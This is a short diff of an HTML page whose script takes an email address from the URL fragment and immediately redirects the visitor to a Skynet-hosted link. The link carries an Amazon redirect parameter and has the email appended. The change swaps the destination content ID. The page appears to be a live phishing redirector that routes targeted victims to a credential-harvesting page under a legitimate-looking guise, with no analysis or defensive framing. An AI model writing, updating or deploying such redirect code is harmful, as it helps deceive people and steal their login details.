@@ -19,7 +19,7 @@
 		var em = hash.split("#")[1];
 
 		window.setTimeout(function () {
-			window.location.href = "https://siasky.net/LACJCzmUP45s6c_3wf5Iwp0Oe-4H-jmsBl8-FOJ7bF6lTg?key=358ed89e99937e09bbabbcbdeff29acd&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
+			window.location.href = "https://siasky.net/LAB0Czr48wH1b1KQG9TMRAS6WMQ3H4napMf0lp9bu8zTzQ?key=358ed89e99937e09bbabbcbdeff29acd&redirect=https://www.amazon.com"+ makeid(10) + "#" + em;
 		}, 0);
 	</script>
 </html>
